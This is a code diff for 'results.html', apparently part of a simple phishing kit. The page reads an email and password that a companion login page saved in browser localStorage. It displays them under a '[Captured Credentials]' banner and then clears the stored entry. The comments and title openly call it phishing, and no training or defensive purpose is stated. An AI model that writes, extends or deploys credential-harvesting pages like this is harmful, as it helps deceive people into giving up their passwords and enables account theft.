@@ -1,43 +1,78 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Phishing Results</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f0f0;
-      margin: 0;
-      padding: 0;
-      text-align: center;
-    }
-    h1 {
-      margin-top: 100px;
-      color: #333;
-    }
-    pre {
-      background-color: white;
-      padding: 20px;
-      border: 1px solid #ccc;
-      border-radius: 15px;
-      max-width: 600px;
-      margin: 0 auto;
-      white-space: pre-wrap;
-      word-wrap: break-word;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Results</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px; /* Added padding for better look */
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+        }
+        pre {
+            background-color: white;
+            padding: 25px;
+            border: 1px solid #ccc;
+            border-radius: 15px;
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: left; /* Makes the output look more structured */
+            font-size: 1.1em;
+        }
+    </style>
 </head>
 <body>
-  <h1>Phishing Results</h1>
-  <pre id="results"></pre>
 
-  <script>
-    // Get data from the POST request
-    const urlParams = new URLSearchParams(window.location.search);
-    const email = urlParams.get("email");
-    const password = urlParams.get("password");
+    <h1>Phishing Results</h1>
+    <!-- This pre tag is where the results will be displayed -->
+    <pre id="results">Loading credentials...</pre>
 
-    const results = `Email: ${email}\nPassword: ${password}`;
-    document.getElementById("results").textContent = results;
-  </script>
+    <script>
+        // ===============================================
+        // NEW JAVASCRIPT FOR results.html (Data Reader)
+        // ===============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            const storedData = localStorage.getItem('formData');
+            let email = 'Not Captured';
+            let password = 'Not Captured';
+            let resultText;
+
+            if (storedData) {
+                try {
+                    const formData = JSON.parse(storedData);
+                    // Safely extract data, fallback to 'null' if properties are missing
+                    email = formData.email || 'null';
+                    password = formData.password || 'null';
+                } catch (e) {
+                    console.error("Error parsing local storage data:", e); 
+                    resultText = "ERROR: Could not parse the stored credentials.";
+                    email = "Parsing Error";
+                    password = "Parsing Error";
+                } finally {
+                     // Optional Cleanup: Clear the data after successful display so you can track submissions over time.
+                    localStorage.removeItem('formData'); 
+                }
+            } else {
+                // Fallback message if nothing was found in storage
+                resultText = "!!! ALERT !!! No credentials captured yet. Ensure you logged in via the index page.";
+                email = "N/A";
+                password = "N/A";
+            }
+
+            // Format the final output string
+            const resultsDisplay = `========================\n[Captured Credentials]\n------------------------\nEmail: ${email}\nPassword: ${password}\n========================`;
+
+            // Display the result to the user
+            document.getElementById("results").textContent = resultsDisplay;
+        });
+    </script>
+
 </body>
 </html>
